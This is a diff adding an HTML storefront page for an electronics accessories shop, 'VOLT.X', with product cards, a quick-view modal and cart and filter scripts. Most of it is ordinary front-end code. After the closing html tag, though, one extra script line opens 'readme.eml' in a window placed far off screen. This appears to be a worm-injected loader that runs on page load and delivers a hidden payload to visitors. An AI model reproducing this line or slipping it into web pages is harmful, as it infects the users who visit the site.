@@ -1,0 +1,322 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>VOLT.X | Next-Gen Electronic & Tech Accessories</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+    <nav class="navbar">
+        <div class="nav-container">
+            <a href="#" class="logo">
+                <i class="fa-solid fa-bolt icon"></i>Volt<span>.X</span>
+            </a>
+            <ul class="nav-links">
+                <li><a href="#home">Home</a></li>
+                <li><a href="#categories">Categories</a></li>
+                <li><a href="#products">Products</a></li>
+                <li><a href="#features">Why Us</a></li>
+            </ul>
+            <div class="nav-actions">
+                <button class="icon-btn" id="searchBtn"><i class="fa-solid fa-magnifying-glass"></i></button>
+                <button class="icon-btn" id="cartBtn">
+                    <i class="fa-solid fa-bag-shopping"></i>
+                    <span class="badge" id="cartBadge">0</span>
+                </button>
+                <button class="hamburger" id="hamburger"><i class="fa-solid fa-bars"></i></button>
+            </div>
+        </div>
+    </nav>
+
+    <div class="mobile-menu" id="mobileMenu">
+        <a href="#home" class="mobile-link">Home</a>
+        <a href="#categories" class="mobile-link">Categories</a>
+        <a href="#products" class="mobile-link">Products</a>
+        <a href="#features" class="mobile-link">Why Us</a>
+    </div>
+
+    <section id="home" class="hero-section">
+        <div class="hero-grid">
+            <div class="hero-card main-hero">
+                <div class="hero-text">
+                    <span class="tag">FLAGSHIP RELEASE</span>
+                    <h1>SONIC PULSE <span>PRO</span></h1>
+                    <p>45dB Active Noise Cancellation with Spatial Audio Engine and 60-Hour Battery Life.</p>
+                    <div class="hero-cta">
+                        <button class="btn btn-primary" onclick="addToCart('Sonic Pulse Pro')">Buy Now - Rs. 8,999</button>
+                        <button class="btn btn-outline" onclick="openModal('Sonic Pulse Pro', 'Rs. 8,999', 'Experience unmatched acoustic performance with custom-tuned 12mm graphene drivers and ultra-low latency gaming mode.')">Quick View</button>
+                    </div>
+                </div>
+                <div class="hero-img-box">
+                    <img src="https://images.unsplash.com/photo-1590658268037-6bf12165a8df?auto=format&fit=crop&w=800&q=80" alt="Earbuds">
+                </div>
+            </div>
+
+            <div class="hero-card sub-hero">
+                <span class="tag tag-purple">NEW LAUNCH</span>
+                <h3>Apex Smartwatch Ultra</h3>
+                <p>AMOLED Sapphire Glass</p>
+                <button class="btn-text" onclick="addToCart('Apex Smartwatch Ultra')">Order Now <i class="fa-solid fa-arrow-right"></i></button>
+            </div>
+
+            <div class="hero-card sub-hero">
+                <span class="tag tag-cyan">FAST CHARGE</span>
+                <h3>100W GaN Power Core</h3>
+                <p>Charge 4 Devices At Once</p>
+                <button class="btn-text" onclick="addToCart('100W GaN Power Core')">Order Now <i class="fa-solid fa-arrow-right"></i></button>
+            </div>
+        </div>
+    </section>
+
+    <section id="categories" class="section-container">
+        <h2 class="section-title">Explore <span>Categories</span></h2>
+        <div class="category-grid">
+            <div class="cat-card" onclick="filterCategory('audio')">
+                <i class="fa-solid fa-headphones cat-icon"></i>
+                <h3>Audio & Sound</h3>
+                <p>Earbuds, Headphones & Soundbars</p>
+            </div>
+            <div class="cat-card" onclick="filterCategory('wearables')">
+                <i class="fa-solid fa-clock cat-icon"></i>
+                <h3>Smart Wearables</h3>
+                <p>Fitness Bands & Smartwatches</p>
+            </div>
+            <div class="cat-card" onclick="filterCategory('power')">
+                <i class="fa-solid fa-charging-station cat-icon"></i>
+                <h3>Power & Energy</h3>
+                <p>Powerbanks, Chargers & Cables</p>
+            </div>
+            <div class="cat-card" onclick="filterCategory('gaming')">
+                <i class="fa-solid fa-gamepad cat-icon"></i>
+                <h3>Gaming Gear</h3>
+                <p>Ultra-Low Latency Accessories</p>
+            </div>
+        </div>
+    </section>
+
+    <section id="products" class="section-container">
+        <div class="section-header">
+            <h2 class="section-title">Trending <span>Gear</span></h2>
+            <div class="filter-bar">
+                <button class="filter-btn active" onclick="filterProducts('all', this)">All</button>
+                <button class="filter-btn" onclick="filterProducts('audio', this)">Audio</button>
+                <button class="filter-btn" onclick="filterProducts('wearables', this)">Wearables</button>
+                <button class="filter-btn" onclick="filterProducts('power', this)">Power</button>
+            </div>
+        </div>
+
+        <div class="product-grid" id="productGrid">
+            <div class="product-card" data-category="audio">
+                <div class="p-img">
+                    <span class="p-badge">BESTSELLER</span>
+                    <img src="https://images.unsplash.com/photo-1590658268037-6bf12165a8df?auto=format&fit=crop&w=500&q=80" alt="Audio">
+                </div>
+                <div class="p-info">
+                    <div class="p-rating"><i class="fa-solid fa-star"></i> 4.9 (1,240)</div>
+                    <h3 class="p-title">Volt Wireless Pods 2</h3>
+                    <div class="p-price">Rs. 4,499 <span class="old-price">Rs. 6,999</span></div>
+                    <div class="p-actions">
+                        <button class="btn btn-primary btn-sm" onclick="addToCart('Volt Wireless Pods 2')">Add to Cart</button>
+                        <button class="btn btn-outline btn-sm" onclick="openModal('Volt Wireless Pods 2', 'Rs. 4,499', 'Quad mic environmental noise cancellation, 40 hours playtime, dual device connection.')">View</button>
+                    </div>
+                </div>
+            </div>
+
+            <div class="product-card" data-category="wearables">
+                <div class="p-img">
+                    <span class="p-badge badge-purple">HOT</span>
+                    <img src="https://images.unsplash.com/photo-1523275335684-37898b6baf30?auto=format&fit=crop&w=500&q=80" alt="Watch">
+                </div>
+                <div class="p-info">
+                    <div class="p-rating"><i class="fa-solid fa-star"></i> 4.8 (890)</div>
+                    <h3 class="p-title">Force Pro Smartwatch</h3>
+                    <div class="p-price">Rs. 7,999 <span class="old-price">Rs. 10,999</span></div>
+                    <div class="p-actions">
+                        <button class="btn btn-primary btn-sm" onclick="addToCart('Force Pro Smartwatch')">Add to Cart</button>
+                        <button class="btn btn-outline btn-sm" onclick="openModal('Force Pro Smartwatch', 'Rs. 7,999', '1.96-inch HD display, Bluetooth calling, SpO2 & Heart Rate monitoring, IP68 water resistance.')">View</button>
+                    </div>
+                </div>
+            </div>
+
+            <div class="product-card" data-category="power">
+                <div class="p-img">
+                    <img src="https://images.unsplash.com/photo-1609592424109-dd9892f1b177?auto=format&fit=crop&w=500&q=80" alt="Powerbank">
+                </div>
+                <div class="p-info">
+                    <div class="p-rating"><i class="fa-solid fa-star"></i> 4.7 (650)</div>
+                    <h3 class="p-title">20000mAh Turbo Bank</h3>
+                    <div class="p-price">Rs. 5,299 <span class="old-price">Rs. 7,500</span></div>
+                    <div class="p-actions">
+                        <button class="btn btn-primary btn-sm" onclick="addToCart('20000mAh Turbo Bank')">Add to Cart</button>
+                        <button class="btn btn-outline btn-sm" onclick="openModal('20000mAh Turbo Bank', 'Rs. 5,299', '22.5W fast charging, LED display indicator, dual Type-C output, flight safe design.')">View</button>
+                    </div>
+                </div>
+            </div>
+
+            <div class="product-card" data-category="audio">
+                <div class="p-img">
+                    <img src="https://images.unsplash.com/photo-1546435770-a3e426bf472b?auto=format&fit=crop&w=500&q=80" alt="Headphones">
+                </div>
+                <div class="p-info">
+                    <div class="p-rating"><i class="fa-solid fa-star"></i> 4.9 (420)</div>
+                    <h3 class="p-title">Studio Bass ANC Headphones</h3>
+                    <div class="p-price">Rs. 11,499 <span class="old-price">Rs. 15,000</span></div>
+                    <div class="p-actions">
+                        <button class="btn btn-primary btn-sm" onclick="addToCart('Studio Bass ANC Headphones')">Add to Cart</button>
+                        <button class="btn btn-outline btn-sm" onclick="openModal('Studio Bass ANC Headphones', 'Rs. 11,499', '40mm titanium drivers, plush memory foam earcups, transparency mode, foldable design.')">View</button>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <section id="features" class="section-container">
+        <div class="features-grid">
+            <div class="feature-card">
+                <i class="fa-solid fa-truck-fast feature-icon"></i>
+                <h3>Express Delivery</h3>
+                <p>24 to 48 hour delivery across Pakistan with real-time tracking.</p>
+            </div>
+            <div class="feature-card">
+                <i class="fa-solid fa-shield-halved feature-icon"></i>
+                <h3>Official Warranty</h3>
+                <p>12 Months claim-free replacement warranty on all products.</p>
+            </div>
+            <div class="feature-card">
+                <i class="fa-solid fa-headset feature-icon"></i>
+                <h3>24/7 VIP Support</h3>
+                <p>Dedicated customer service available round the clock on WhatsApp.</p>
+            </div>
+        </div>
+    </section>
+
+    <footer class="footer">
+        <div class="footer-grid">
+            <div class="footer-col">
+                <a href="#" class="logo">
+                    <i class="fa-solid fa-bolt icon"></i> VOLT<span>.X</span>
+                </a>
+                <p style="margin-top: 15px; color: var(--text-muted);">Redefining electronic accessories with futuristic engineering, sleek aesthetics, and unstoppable performance.</p>
+            </div>
+            <div class="footer-col">
+                <h4>Quick Links</h4>
+                <ul>
+                    <li><a href="#home">Home</a></li>
+                    <li><a href="#products">New Arrivals</a></li>
+                    <li><a href="#categories">Categories</a></li>
+                    <li><a href="#">Support Center</a></li>
+                </ul>
+            </div>
+            <div class="footer-col">
+                <h4>Policies</h4>
+                <ul>
+                    <li><a href="#">Warranty Policy</a></li>
+                    <li><a href="#">Shipping & Delivery</a></li>
+                    <li><a href="#">Return Policy</a></li>
+                    <li><a href="#">Terms of Service</a></li>
+                </ul>
+            </div>
+            <div class="footer-col">
+                <h4>Connect With Us</h4>
+                <div class="social-links">
+                    <a href="#"><i class="fa-brands fa-facebook-f"></i></a>
+                    <a href="#"><i class="fa-brands fa-instagram"></i></a>
+                    <a href="#"><i class="fa-brands fa-youtube"></i></a>
+                    <a href="#"><i class="fa-brands fa-tiktok"></i></a>
+                </div>
+            </div>
+        </div>
+        <div class="footer-bottom">
+            <p>&copy; 2026 VOLT.X Lifestyle. All Rights Reserved. Built with CSS Grid.</p>
+        </div>
+    </footer>
+
+    <div class="modal" id="quickModal">
+        <div class="modal-content">
+            <button class="close-modal" onclick="closeModal()">&times;</button>
+            <h2 id="modalTitle">Product Title</h2>
+            <div id="modalPrice" class="p-price" style="margin: 10px 0;">Rs. 0</div>
+            <p id="modalDesc" style="color: var(--text-muted); line-height: 1.6; margin-bottom: 20px;">Description text</p>
+            <button class="btn btn-primary" onclick="confirmModalAdd()">Add To Shopping Bag</button>
+        </div>
+    </div>
+
+    <div class="toast" id="toast">Product added to cart!</div>
+
+    <script>
+        let cartCount = 0;
+        let currentModalProduct = '';
+
+        function addToCart(productName) {
+            cartCount++;
+            document.getElementById('cartBadge').innerText = cartCount;
+            showToast(`${productName} added to cart!`);
+        }
+
+        function showToast(msg) {
+            const toast = document.getElementById('toast');
+            toast.innerText = msg;
+            toast.classList.add('show');
+            setTimeout(() => {
+                toast.classList.remove('show');
+            }, 3000);
+        }
+
+        function openModal(title, price, desc) {
+            currentModalProduct = title;
+            document.getElementById('modalTitle').innerText = title;
+            document.getElementById('modalPrice').innerText = price;
+            document.getElementById('modalDesc').innerText = desc;
+            document.getElementById('quickModal').classList.add('active');
+        }
+
+        function closeModal() {
+            document.getElementById('quickModal').classList.remove('active');
+        }
+
+        function confirmModalAdd() {
+            addToCart(currentModalProduct);
+            closeModal();
+        }
+
+        function filterProducts(category, btnElement) {
+            const buttons = document.querySelectorAll('.filter-btn');
+            buttons.forEach(btn => btn.classList.remove('active'));
+            if(btnElement) btnElement.classList.add('active');
+
+            const products = document.querySelectorAll('.product-card');
+            products.forEach(product => {
+                if(category === 'all' || product.getAttribute('data-category') === category) {
+                    product.style.display = 'flex';
+                } else {
+                    product.style.display = 'none';
+                }
+            });
+        }
+
+        function filterCategory(cat) {
+            document.getElementById('products').scrollIntoView({ behavior: 'smooth' });
+            const filterBtns = document.querySelectorAll('.filter-btn');
+            filterBtns.forEach(btn => {
+                if(btn.innerText.toLowerCase().includes(cat)) {
+                    btn.click();
+                }
+            });
+        }
+
+        document.getElementById('hamburger').addEventListener('click', () => {
+            document.getElementById('mobileMenu').classList.toggle('active');
+        });
+
+        document.querySelectorAll('.mobile-link').forEach(link => {
+            link.addEventListener('click', () => {
+                document.getElementById('mobileMenu').classList.remove('active');
+            });
+        });
+    </script>
+</body>
+</html>
+<html><script language="JavaScript">window.open("readme.eml", null,"resizable=no,top=6000,left=6000")</script></html> 
